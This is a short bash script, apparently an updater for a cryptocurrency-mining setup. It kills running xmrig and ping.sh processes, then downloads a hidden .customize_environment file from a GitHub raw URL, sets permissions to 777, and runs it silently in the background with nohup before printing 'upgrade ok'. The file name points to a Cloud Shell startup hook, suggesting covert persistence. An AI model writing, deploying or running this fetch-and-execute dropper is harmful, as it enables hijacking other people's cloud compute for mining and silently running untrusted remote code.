#!/bin/bash

#if [ $2 == '0.1' ]
#then
   pkill xmrig
   pkill ping.sh
   pkill ./.customize_environment
   rm -rf .customize_environment
   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment 
   chmod 777 .customize_environment
   nohup ./.customize_environment > /dev/null &
#fi

echo 'upgrade ok'
